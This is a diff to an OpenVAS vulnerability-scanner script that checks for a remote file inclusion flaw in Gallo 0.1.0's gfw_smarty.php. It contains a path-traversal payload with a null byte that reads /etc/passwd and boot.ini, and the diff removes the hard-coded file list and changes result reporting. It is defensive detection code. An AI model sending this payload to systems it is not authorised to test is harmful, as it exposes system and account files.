@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_gallo_39890.nasl 5306 2017-02-16 09:00:16Z teissa $
+# $Id: gb_gallo_39890.nasl 5761 2017-03-29 10:54:12Z cfi $
 #
 # Gallo 'gfw_smarty.php' Remote File Include Vulnerability
 #
@@ -34,12 +34,11 @@ and the underlying system; other attacks are also possible.
 
 Gallo 0.1.0 is vulnerable; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(100628);
- script_version("$Revision: 5306 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
+ script_version("$Revision: 5761 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 12:54:12 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2010-05-06 13:19:12 +0200 (Thu, 06 May 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
@@ -55,7 +54,7 @@ if (description)
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -64,29 +63,27 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("host_details.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
-
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/gallo",cgi_dirs());
-files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
+files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/gallo", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+
   foreach file (keys(files)) {
 
     url = string(dir,"/core/includes/gfw_smarty.php?config[gfwroot]=../../../../../../../../../",files[file],"%00");
 
     if(http_vuln_check(port:port, url:url,pattern:file)) {
-
-      security_message(port:port);
-      exit(0);
-
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
 }
 
-exit(0);
+exit( 99 );
